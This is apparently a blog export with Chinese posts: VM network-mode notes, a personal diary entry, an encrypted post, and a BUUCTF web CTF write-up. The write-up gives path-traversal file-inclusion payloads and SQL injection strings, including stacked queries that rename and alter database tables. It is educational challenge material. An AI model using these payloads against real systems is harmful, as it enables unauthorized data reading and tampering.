<p><img src="https://i.loli.net/2021/10/08/zReG8n63lvoM7Ni.png" alt="image-20211008202237411"></p>
<blockquote>
<p>使用 真实机 ping 192.168.4.234</p>
<p>实际上，只要是处于该网段中的任意一台计算机都可以 ping 通 我们所设置的 虚拟机</p>
</blockquote>
<p>当中可能出现的错误：解决办法 （注意：需要使用 管理员方式运行；关闭要ping 的主机的防火墙）</p>
<p><img src="https://i.loli.net/2021/10/08/vJOUVGj97s4ip6F.png" alt="image-20211008203642130"></p>
<p><img src="https://i.loli.net/2021/10/08/3unJasAW6EZprLj.png" alt="image-20211008204622495"></p>
<ul>
<li>当不需要与外网进行通信，也就是平时我们 仅仅搭建一个小型局域网的 测试，只需要我们的几个虚拟机之间进行通信，我们就不用使用 VMnet0 ，可以使用 其他的交换机或者是 使用 Host-Only</li>
<li>**NET **：通过真实机 上网，存在一个地址转换，只要是真实机所能访问的所有网络，虚拟机均可</li>
<li><strong>Host-Only</strong> ：仅主句模式，仅仅能与 真实机 进行通信</li>
</ul>
<blockquote>
<p><strong>补充：</strong></p>
<p><strong>169.254.X.X</strong></p>
<p>是Windows操作系统在DHCP信息租用失败时自动给客户机分配的IP地址。但是是无法与网关通信的，也无法接入Internet的情况。</p>
</blockquote>
<p><a href="https://www.cnblogs.com/cnjavahome/p/11266931.html">虚拟机网络设置 参考</a></p>
]]></content>
      <categories>
        <category>计网</category>
      </categories>
      <tags>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>难熬的一夜</title>
    <url>/2021/10/01/%E9%9A%BE%E7%86%AC%E7%9A%84%E4%B8%80%E5%A4%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>难以想象，现在是8月27日5：56，我现在正躺在床上，写着这篇感想。</p>
<p>这个时间，对于我来说，怎么可能，不在睡觉，可事实是，什么鬼，我简直不敢相信，我入戏就</p>
<p>这么深吗，从前根本没有这样过，整整一个晚上，我满脑子都是剧情，可怕的剧情。夜里，好多</p>
<p>次清醒着，却又不敢睁眼，生怕一睁眼，就会有那张脸出现在我的眼前。要么就是满脑子的男主</p>
<p>女主，我对男主的经历感到很难过，并不是他的错啊，他也很痛苦啊，可是为什么要让他来承受</p>
<p>这一切。哎，总之，我很伤心，更为之心痛。</p>
<p>天色渐渐明朗，我听见了下面阿姨的扫地声，突然就不觉着害怕了，因为，这个世界很美好的不</p>
<p>是吗？你自己不也说过，这个世界，远比你想象的更加美好！太阳总会升起，世界总会迎来光</p>
<p>明。</p>
<p>就当是在给自己壮胆吧，世界的黑暗也总得有人知道，它在帮助我们变得更加勇敢。</p>
<p>2021.8.27    6：12</p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>雨天心事</title>
    <url>/2021/10/09/%E9%9B%A8%E5%A4%A9%E5%BF%83%E4%BA%8B/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="94ca14958087636ac0d05246e2f08cdc77fbac705e80a44b4b290d7e348a4393">e91be0fd6c8a9227b7bcbe4e5e48d315c06aa4dc378147e1803de676640ec653b48c636617909faef5c22569585e67f2624f943dbd04bc3a4bc1e889c96c1c44fe86cf8189cc7f38066de20ed3e09ee470446ca383e292a288f38c1ff5a6edeaf4522c2592050d45424806119cfb091fff3cbf4949ac22db198b289b6718d25fd5258f1ac1fe9c84ef42543328f72721346d1f720eaba9fc244eba04c8158a640746cb6d2adf765058859136d535a857c9fd4a6bf6c4586394fda58cb6da01920d51f442b2b14d924759f4e4cd4079a0e838844ff4e3d58efd94fa90ce4278c3c924518f7802a60c16990c8977390c1238303a31f9328b73dc4ccae66a1c01a8bad2339e90bc4e00a3078f567cceac7ccea98820aece5f9ec96983a258624a5f5be0ac312748d1794e5d0849439130e5dd3c59665522e84a71bfd23c75bf056e21e2569a055563db1688fcca74f84234a845c119485dfd1d8d1edc96a39ed01c7a62cf262c6478bcb26f7e1cb279673b2bc978c68f035cdb801c095dc71bb0a1b7b800d648f8744394e428bff9c5042c611a83a5e2c0032258d4a8364ca987a0ed987df761031bb902a20d1b177273b561745ad3a171c4c2b5b6d9d47f2e258e653adc2ea9c73aeb1d907931a2e908289f80eb9202dac06035ba030297970f3235467707bf4485da5dd63ead56b4ed76b62d8c566ce726df1e1d1b32f12ec2313193c89bf97252f85e62fcd5cd447772503afcdf0ec62b9edf620d6c1de3bbd9ed66924c2856866cd7bb8ca4b1ca2da9db20f55c652b0aa28f4abd3c10316c9fbd60d0492370b873dda7f4213b05b015802af576956b13c13dc0f3c2bc420ef4656ad6e5003f24c6c562a54d3edd9e21cb49b6bce46f8c39200f2e268fae8aabaec974beeb47eb2b60b57966f327ba54bc492617000f7b2601fa422534022c39437d7495f39ce645ff2e7408359b9cca0777508adf4984c92f0ac6c68722abf6df8ae58d3358efc20c71d42a1a49d1458f6e2791ffae2dd1fdad1099fa60c2659e235224b9a5328a88e1d028171398d07a81e3dd51a63bc9bc25d488a6cedf0c10465354928eb1444d3eb0e5738a4602e5c624649f04e94bae613052604916bd2a3cb04ec418314ee55962cf5e27fbe27d526cb96324e2e40a18967c596e83cda0bdc562ed9259aaec04379fd1218cc92ca702205b7516de1b094f71e3b9f6254b664a83a8936829d1034a3896f69683138c3a09816cb41b259686f18042f7f2deb0ee9db058697a2765b3f0175c01499c715972db584137319bbeda1579d123f6ae7944cae638a103677458833b7c559fc608bc6d282e66f16c54f98fe79f6c9de7b0ab33aaa0d680b1904e6b1fc801e12b471aab330a1686c4c0c312bd6c68699c9ee6172ffc34a2646aea9b508791b1ba10c2113f30d074908e87382f5d78f1690fdd1eeb2179724542adffd134d6fc3c2cb77a13caa5172b68e56aef84ed004ea57ea42273513b40844462eb67b6a5024b19bac140bdf467d8f736cb1b2bc5694972b57c8e84daf515ffaf0504d739a482c29fa5d302ed9669d09d10d23dc9a28b63abf17ae2a55438f43e53b7d532819cbaa1af4541ce6bd47c07e1d59a17f5f4ac1379a64801ae38353722aedceafcad0c189886be14130c40cee0a9c4bee04386a7e23d97fe3c08b7c44c08fa8afb06c00a102338dfb22439fac82a95ea2eba137676f11f7ce604f2e6eec63f6de01a5c209935a835c72ac76294448261b37111997e4ed1e6d4047ca3801608d9ee222af4a3dd68c3bd21ca3d6f47738f78b99f407b008901d91ea716b360502d1661055fceb90f8012f11ed98fd97fbfc748b1e190c58233a9d36d2a0f50bc44151899d39cea909f815c2c9d45ffcb17481822672828839bd91b52f3884def95db15ec53b69bb64985278c7471ab8565c928679cd72fbe08b2634836ff2f612f1ac891d04a43986232d844df4898945b30e7d1522f52ddef4c7c54fe45571fb8968bc6aabdc60787a50c4fff2ac0d165a2748d195a2c4fb60fd60c7dd1975079f11d6f8ffa5d5e00e5ab31fb513fd98f2c1e85631757a5416883c65883347ebb6bce8fdcaac9c9382bec2c36f954043b2a988255ba090bd93d75aeba437785d527b14463abb060f7661f7551aaf13ad821a8dcb34afa4c6aa792aedfe7c6068c5a4da15237cd829ea449811c6b006bb727017abda017fac99a3509098fb0303bac8557834afc970bbf665d8f0d847719616e9f778eb369eaf37552c8f2b32a86df799a77bc90647fc0a6ba3b2d92cc8a3780c43ebecd9c448a25d50856c6f954a26cf53adda4b8ffcd85b83510e485d80e7483a4ead53cebe5a05d4f054c3749272dd609a3d4c2f9ba9417eb40006daca8df6514569e1957aeb4f8b5e98963caf65d27cb7e8ce7f6329d0a6650e199500665142861c371a75e026927715382a4820920058aee5f866061caf1a37fc58198d97de602d7dbf10d27541f51c6da0290c25a5569cc200eb0c01035ef4fad9912ad8f74bc8a64d732d7977f5c1e700a2bc3598ba53f2f0795ab00e46a7ae849c820a9a400d77e42276d5b98427c358485821cf30bb614e398f7bf4619f06faad328fe747050707425d555b15d42bcf96c96cfdf87f14868c47e258c4c07789868b993a6f66a4f8f7d9b7e9daf797f1758691e6bea0904419f646db5924a8d3aac4adaea6b3b1aedaabde1eb3628f8e600bcf61db58ebe7234e673f310abd47c43bf1929cb7a318dee824322576dd7f143632fb1e43a697ad839227fbc93fcbb9af60dc4c3fb55d316716ae876dd818e33e1a50c625b7f41088bb86ceb4c959b9706a45b37d5fc20d89b8018dd2c33a144abf571e0b85181ef941cb0fd74609909479247e2e27dac1675a7cf16e7215773088afdf3fb92e43fe0af7d6c42df710ee12bc21890450069c91f20ca44e84b88ca022c12be5e8aba6d4628586a351525584fc7350b6e621db0770e3f0dafa41c086ad31e425b244278bcac27786979121de9786ec584aed4d14c069bb4a7ae7b28976a242bd77536fb1d4a6f58f9cc18bd7e3af91ebc220e7b750a857f5789f01fa1958c0c2d16b8bf2009f503a436c4b8bf99833f759dbb4d5616c3afc888290fc24ae5277f2f66721124c4af5fd3dd4082896ea3022b3728be487013dbf392e4a639e37d2d4ed644ce2ad68e1a78100c9113e4ca0c3090cc5038bc586ad24199e865fb96fbbc463a2436cfb63c9fcd45b65b35de0e041f8ea6765707b527d8019dbb1a5d17798cb92d6f09b117fa950322fd118bc4d10c9762fbe4ca663fa6e61bafa67aa7e9d4cb708ef708eff7df31c8ab0a455394ca7d37037803f28f864e628dd565f36c6bafeb59add329dbd87425552fcd1e342a3e79f057afdb0c4b411431e3df2481fb0f98fe2dbf69b0d26eedfc85cb9fac0f227b3c43060475df00777a3807d5cea69beba98c0d3eff659cab74c68ededc31ae6769c099c857f5207c75166ceea59e7d170c9b760087e6db779ceed663dc577426e44559d4e31bc1edcebd52a913fe1d633c1bcec9305cdea673eb1cf43b628a4516875c53a33ca93b3f095ea140428826ca473d3cb339507a709063abfd3352c9e39decf38022e3b0bb6281e289f5f4ea2f0ca6873cef1c20a73613d1d450d4fbe4f80b9bcb0a1dff03ce4b594ae7c25b8c68ab0105db039b38d594ebaa043357a9a617b7df0fefddfdc9b8cf66a9c325438ed2d54318bc01241b7ff022376c243823bc69af8455c685a182cbb3d5cff6ca9c79842d1d8c06f8114ff3596f15848c31b664ec900d31e1cb7e9a791d63457da97d546bac2cb81c0b598d0b6a6b33155c57ce2cd84a7c3003256ff0bdd4c917232c4e2dd1399fb6f9ca4d47da22e15bc7601f4f068f776565696627c3ec3aea2cde94f0800d7a58ddc26af1fca482935f4b16a8874bfacba7f099688b8f0cb8796c52f33c1ee34b73431cd1f68f76ee680e186ec206009f28ad6c77a7c495f112aeb97ff99ee367e1f195d2c229323525263ed6dcf0bb15a8a881395c854939a5741445f6c99aeecf295ad810e77e9dff139dd2a698e914fadf6f0a2732768fa35a73df3809a1bffae7df8dbe80a2eec699721530ba5ebb68669415f46be5ff2f08d7f3d8eb0b54b3b293dacc5e797ef9b5c2e145a72baf5e4a9fa4a737b42618695e8be18dd62546b56d9aae3d7d292f2374cf111f036116184600774736805ddf3c3f1d160976e1c63899c11f761df1b3b68d6fc11d67394c3d296473f15af8240573254e04dc150843ef053b7a27b3016422973cb3b0df94b49ace7df6bf8f0ea25ec7e9403f21d27e95bd8e3b83ef789a06cd6146004101587b89aae82dbe29d39d2710960e0f65388ebaaa62df2d805072076382d1fe54221f44a88c9087e79c3a8d179c86ce2c3c26ee2a34a20d15fb84d8c5cbf8ac2ba71d8c2a87b7df2463e7ee444ab73aded693c5d657006237acd35168cb75bc47e4906b4c19272269123fc661173da644fbd39609896ec0f2cead77e76dc1ee49c4e81dd8f63a9be3ca52537268add9314636c27481227478d80d7e1f0168ea5d964eaae9b4ece4002aa6be7f14d75f71d2fc71864a7238784e2da5a5faed06a2a8f6c707cfcf05709bb5dd82d7d932c46ccb01c9762a151b6fd82be52b4204bd401ad5208a10710b2832cfd5f6e1ae2148cb7c82bc90e7e3b439bbb28c9a139a96f2dbef06370307a8adad885b48faa3a1ad1cd9e898fd0a75ca6b03e1883da7e4e23400dd057d1ac9ab17fe7b586d9e90b89489f6b61dd8c4e7d6ac1336da199bfd2e47c192edd7067a2c758ce4974344ab46a05b0d865169c5e0ab965ee51700eecd54e703a70bca9b05685022e01199cefbff96e227c56a8b11b93abcdd441948a4cd5822bf43f6d86f29c67fb52ce8eaa5d4e107649d970895c287afdd4685ee59d452a9a0c149e0b0fb34e580f4786b0e97cbb769bd0ddaeceabaf5233a809ea07a6c15205441c0b1ec7341f0b25b2f6f952eeeb4b4600f2b57da884d0c4cc1a9216220b0f6a4041577031c6299b4d1ee28eb8eb663e613a0679aed2a0b29c5a249e5d0d1386e94d83b4b0c87021be917f69eb91f4717b74f2d6c13381858c7fe303fb9bf1cfb249498eb93ad567a168dcc1946b9cf7ee6e7d430e190695077e2013d0b46a47e6c11fd53ac1cb074c05e5eba8c8363c5e59d6045d9a46b055a14e3269ea758d7d0a66cbd788b055fc88cf30d90c68059a91456688987840e1a919714311dccf193ef6f0a7f500ad356b757864afc1cda5e4b618058a32bd774ffe71ce9e82093538027ac138c1514c1f00d83dcfa97ca51a6f140e20e0a4560e8b54eff6744a976bb5c7baa11924beb4e94ad9f49ca9d9077f7614df7c889b3334914f363627fae85c0651385442550039d76d48ab36b690328bfcf81d4b030cf2a62afb6a66bd105f7e9badb54c41fe8646ef7ddd05977e033d37533e38c1a3dc40046662982b2539adc3e77df4352f5fe6767ccf09929940a254c9ecd4a742f74fb4eeb2bdfd6716368ab038bb0a9981d0e5acb78a6cd36e6830977111a468571bb1e811126022dc7d0bdcef72cb1cb836a688036015fb8d1502614d93bf367ca82c6b96c9ed534dc172a1220b1033c40d5fa81f9d01026ab395db9b351dfc2e2d4f97db3e3821b74957f23bcf3b523edc5b2b687143c6d036d637c354e3126d52a6cbc1f5c30a98c93fef36c190dc8d21df086caf7d22cbf2b352adfec119a2760cabb31a200abfe502da0059c88f96568c826d67f32df5199731ce8ee841c45137ccfd2341c682335a00e04ed6e7c31f137e032d41eca174e4643d4f749e4c9716f8ad6539ef0010667927430a02bb16285e1c7a2ca530498c6a355520206a27f53cb9607050d8c4f64f448ea7eecdf7751db97505ca3fd09396d5b5f4abb0ff208559b8579ed41a737a161011ade604b7e4a5755aa2f1ccaf7992dd3f59d6771ebfda35c36791e31d3d8442103e2f69c8eb57deb609a206e3a599859113e561998ea474facaea6a50364a9ce4cccee1429a4e1b7dc3bcda37e7f36473c2958a087368331979040687772aca9d07d06275591aa83</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">只给知心的人分享，请在输入密码方可阅读！</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF-Web(一)</title>
    <url>/2021/05/26/BUUCTF-WEB%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>概述：BUUCTF-WEB 前十道题目，比较基础，主要考察文件包含、SQL注入、命令执行、源码泄露。</p>
<span id="more"></span>

<h1 id="一、-HCTF-2018-WarmUp"><a href="#一、-HCTF-2018-WarmUp" class="headerlink" title="一、[HCTF 2018]WarmUp"></a>一、[HCTF 2018]WarmUp</h1><p><strong>考点：文件包含、代码审计</strong></p>
<p>Ctrl + U 查看源码</p>
<p><img src="https://i.loli.net/2021/05/25/XyIsM2bH18rpJow.png" alt="image-20210525233503728"></p>
<p>访问得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,									 </span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>) </span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);	<span class="comment">//url解密</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)	</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])   <span class="comment">//检查变量是否是字符串，是返回 true ，否返回 false</span></span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将获取到的file变量内容进行两次问号过滤，每一次只截取到第一个问号的前面部分内容，我们要想每次截到的部分都符合白名单，即 source.php 或者是 hint.php。</p>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://fde198a0-d059-40ed-bdbd-3812ba8e8ad3.node3.buuoj.cn/source.php?file=hint.php</span><br></pre></td></tr></table></figure>

<p>得到    flag not here, and flag in ffffllllaaaagggg，由于GET传参将会自动对特殊字符进行url编码，则利用 urldecode()函数 构造如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">source.php/?file=hint.php%253f/../../../../ffffllllaaaagggg</span><br><span class="line">source.php/?file=source.php%253f/../../../../ffffllllaaaagggg</span><br><span class="line">source.php/?file=source.php%253f/../../../../../ffffllllaaaagggg</span><br><span class="line"><span class="comment">#问号进行 两次url编码 之后为 % ，GET传参首先自动解码为 %3f(是?进行一次url编码的结果)，其中没有?，原样返回，绕过第一次过滤，然后 urldecode() 函数再次url解码得到问号，第二次问号过滤截取到结果 source.php 符合条件。</span></span><br><span class="line"></span><br><span class="line">source.php/?file=hint.php?/../../../../../ffffllllaaaagggg</span><br><span class="line">source.php/?file=source.php?/../../../../../ffffllllaaaagggg</span><br><span class="line">source.php/?file=source.php?/../../../../../../ffffllllaaaagggg</span><br><span class="line"><span class="comment">#经过GET传参之后变成  =source.php%3f..%2f..%2f..%2f..%2f..%2fffffllllaaaagggg，其中没有?，原样返回，绕过第一次过滤，然后 urldecode() 函数解码回到 =source.php?../../../../../ffffllllaaaagggg，第二次问号过滤截取到结果 source.php 符合条件。</span></span><br></pre></td></tr></table></figure>

<p><strong>总结</strong> :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#总结函数</span></span><br><span class="line">	mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()</span><br><span class="line">	is_string() 检查变量是否是字符串，是返回 <span class="literal">true</span> ，否返回 <span class="literal">false</span></span><br><span class="line">    mb_strpos (haystack ,needle) 返回要查找的字符串（haystack）在别一个字符串（needle）中首次出现的位置，如没有则返回原字符串</span><br></pre></td></tr></table></figure>

<h1 id="二、-极客大挑战-2019-EasySQL1"><a href="#二、-极客大挑战-2019-EasySQL1" class="headerlink" title="二、[极客大挑战 2019]EasySQL1"></a>二、[极客大挑战 2019]EasySQL1</h1><p><strong>考点：SQL注入 之 万能密码 ‘ or 1=1</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#我们使用 &#x27;) 判断闭合方式</span></span><br><span class="line">q<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/2TpK1SiHyGmYEul.png" alt="image-20210526132249797"></p>
<p>单引号闭合</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#万能密码尝试</span></span><br><span class="line"><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/tkDbvaWmpwP28dG.png" alt="image-20210526132358983"></p>
<h1 id="三、-极客大挑战-2019-Havefun1"><a href="#三、-极客大挑战-2019-Havefun1" class="headerlink" title="三、[极客大挑战 2019]Havefun1"></a>三、[极客大挑战 2019]Havefun1</h1><p><strong>考点：源码泄露</strong></p>
<p>Ctrl + U 查看源代码发现</p>
<p><img src="https://i.loli.net/2021/05/26/aR97luXhvdN8gP5.png" alt="image-20210526132810173"></p>
<p>则我们访问 <code>?cat=dog</code> ，得到</p>
<p><img src="https://i.loli.net/2021/05/26/GdCsZ8Nfi51PW2A.png" alt="image-20210526132853326"></p>
<h1 id="四、-强网杯-2019-随便注1"><a href="#四、-强网杯-2019-随便注1" class="headerlink" title="四、[强网杯 2019]随便注1"></a>四、[强网杯 2019]随便注1</h1><p><strong>考点：SQL注入 之 堆叠查询</strong></p>
<p><strong>技能：mysql 表结构的更改语句</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27; 						#得到报错，单引号闭合</span></span><br><span class="line"><span class="string">1&#x27;</span> or 1=1<span class="comment">#				#万能密码尝试</span></span><br><span class="line">1<span class="string">&#x27; order by 2 			#两列</span></span><br><span class="line"><span class="string">1&#x27;</span> union select 1,2<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p><strong>堆叠查询：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/onluSItPbX53JBq.png" alt="image-20210526134222685"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/u74xGYkpWj5m6OB.png" alt="image-20210526134259283"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27;;desc `1919810931114514`;#			#查表的结构</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/j5EK3MPqluzGReb.png" alt="image-20210526134618316"></p>
<p>存在 flag 字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27;;desc words;#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/pVfWFjzJuwgCk7P.png" alt="image-20210526134842151"></p>
<p>注：windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符，引用数字名称时，需要反引号包裹，字母型可不用包裹。</p>
<p><strong>分析：</strong></p>
<p><img src="https://i.loli.net/2021/05/26/MYAPV9gj5KeIEio.png" alt="image-20210526135018943"></p>
<p>我们提交查询的内容应该就是该表（words）中的数据，而SQL语句应该类似于 <code>selsect id,data from words where id =</code> ；而前面已经发现，flag 存在另一张表（1919810931114514）中。</p>
<p>方法一：更改 words 表名 为 其它，1919810931114514 表名为 words；flag 字段名为 id。这样查询的即是 1919810931114514 中的 flag字段了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27;;rename table `words` to `others`;rename table `1919810931114514` to `words`;alter table words change column flag id varchar(100);show tables;desc words;#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/iOU8DzQPqIRwJTM.png" alt="image-20210526142016807"></p>
<p>可以看到表的结构已经成功被我们更改，最后，只需要直接使用万能密码即可</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/nKbufIJkX1rq98p.png" alt="image-20210526142135176"></p>
<p><strong>补充：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0<span class="string">&#x27;;show columns from words;#</span></span><br><span class="line"><span class="string">0&#x27;</span>;show columns from `1919810931114514`;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><strong>总结：mysql 对 表的结构的更改语句</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 修改表名称：</span><br><span class="line">语法一： <span class="keyword">alter</span> <span class="keyword">table</span> tbl_name rename[<span class="keyword">to</span><span class="operator">|</span><span class="keyword">as</span>] new_tbl_name						<span class="comment">--可以更改一张数据表名称</span></span><br><span class="line">语法二：rename <span class="keyword">table</span> tbl_name <span class="keyword">to</span> new_tbl_name [,tbl_name2 <span class="keyword">TO</span> new_tbl_namew……	<span class="comment">--可以多表更改名称</span></span><br><span class="line"></span><br><span class="line">#添加表列</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test <span class="keyword">add</span> <span class="keyword">column</span> name <span class="type">varchar</span>(<span class="number">10</span>); </span><br><span class="line"></span><br><span class="line">#删除表列</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test <span class="keyword">drop</span> <span class="keyword">column</span> name; </span><br><span class="line"></span><br><span class="line">#修改表列类型</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test modify address <span class="type">char</span>(<span class="number">10</span>) </span><br><span class="line"><span class="operator">||</span><span class="keyword">alter</span> <span class="keyword">table</span> test change address address <span class="type">char</span>(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">#修改表列名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test change <span class="keyword">column</span> address address1 <span class="type">varchar</span>(<span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<h1 id="五、-SUCTF-2019-EasySQL1"><a href="#五、-SUCTF-2019-EasySQL1" class="headerlink" title="五、[SUCTF 2019]EasySQL1"></a>五、[SUCTF 2019]EasySQL1</h1><p><strong>考点：堆叠注入、特殊语法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="comment">#							#数字型注入</span></span><br><span class="line">1;select database();<span class="comment">#		#查到数据库 ctf</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/GMCueOBwlAtbSUP.png" alt="image-20210526142736419"></p>
<p>尝试 堆叠注入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1;select database();(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema = <span class="string">&#x27;ctf&#x27;</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>没有获取到，有东西被过滤掉了，继续尝试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1;show database;<span class="comment">#				#查到所有数据库</span></span><br><span class="line">1;show tables;<span class="comment">#					#查到表 flag</span></span><br></pre></td></tr></table></figure>

